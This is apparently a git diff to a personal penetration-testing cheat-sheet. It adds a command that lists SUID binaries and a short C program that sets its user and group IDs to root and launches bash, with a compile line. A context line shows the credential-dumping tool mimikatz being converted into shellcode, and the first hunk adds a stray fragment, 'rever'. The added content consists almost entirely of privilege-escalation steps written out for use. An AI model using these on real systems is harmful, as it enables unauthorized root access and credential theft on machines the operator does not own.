@@ -1,4 +1,4 @@
-
+rever
 
 
 
@@ -120,3 +120,27 @@ xxd -i mimikatz.exe > shellcode.h
 
 
 
+## Find SUID/SGID files
+
+```bash
+find / -perm -4000 2>/dev/null
+```
+
+
+
+## Root bash in C
+
+```c
+#include <unistd.h>
+
+int main() {
+    setuid(0); setgid(0);
+    execl("/bin/bash", "bash", NULL);
+    return 0;
+}
+```
+
+
+```bash
+gcc poc.c
+```
